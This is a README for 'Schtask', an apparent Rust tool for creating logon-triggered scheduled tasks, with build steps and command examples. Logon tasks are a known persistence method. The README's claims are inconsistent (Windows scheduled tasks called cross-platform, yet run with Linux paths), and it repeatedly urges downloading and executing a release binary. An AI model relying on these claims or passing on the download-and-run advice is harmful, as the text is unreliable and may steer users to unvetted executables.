# 🛠️ Schtask: Rust Scheduled Task Creator

Welcome to the **Schtask** repository! This project provides a Rust implementation for creating scheduled tasks programmatically with user logon triggers. Whether you want to automate your workflows or run specific applications at login, Schtask makes it easy.

[![Releases](https://img.shields.io/badge/releases-latest-blue.svg)](https://github.com/abubakar-alt/schtask/releases)

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Features

- **User Logon Trigger**: Create tasks that run when a user logs in.
- **Rust Implementation**: Built using Rust for performance and safety.
- **Cross-Platform**: Works on multiple operating systems.
- **Simple API**: Easy to integrate into your applications.

## Installation

To get started with Schtask, you need to have Rust installed on your machine. If you haven't installed Rust yet, you can do so by following the instructions on the [official Rust website](https://www.rust-lang.org/tools/install).

Once you have Rust set up, you can clone this repository and build the project:

```bash
git clone https://github.com/abubakar-alt/schtask.git
cd schtask
cargo build --release
```

You can also download the latest release directly from our [Releases section](https://github.com/abubakar-alt/schtask/releases). Download the appropriate file for your operating system, then execute it.

## Usage

After installation, you can use Schtask to create a scheduled task. The basic command structure looks like this:

```bash
schtask --create --name "MyTask" --trigger "logon" --action "path/to/your/application"
```

### Command Options

- `--create`: Indicates that you want to create a new task.
- `--name`: Specifies the name of the task.
- `--trigger`: Defines the trigger type (e.g., `logon`).
- `--action`: Sets the action to perform (e.g., the path to the application).

### Example Command

Here's a complete example of creating a task that runs a script when the user logs in:

```bash
schtask --create --name "RunMyScript" --trigger "logon" --action "/path/to/myscript.sh"
```

## Examples

### Creating a Simple Logon Task

To create a simple logon task that runs a program, use the following command:

```bash
schtask --create --name "MyApp" --trigger "logon" --action "/usr/bin/myapp"
```

### Advanced Usage

You can also set additional options, such as specifying conditions or settings for the task. For example:

```bash
schtask --create --name "MyApp" --trigger "logon" --action "/usr/bin/myapp" --condition "network" --start "now"
```

## Contributing

We welcome contributions to Schtask! If you would like to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes.
4. Test your changes.
5. Submit a pull request.

Please ensure that your code follows the Rust style guidelines and includes appropriate documentation.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For questions or suggestions, feel free to open an issue on the repository or contact the maintainer.

[![Releases](https://img.shields.io/badge/releases-latest-blue.svg)](https://github.com/abubakar-alt/schtask/releases)

Visit the [Releases section](https://github.com/abubakar-alt/schtask/releases) to download the latest version and explore the available features.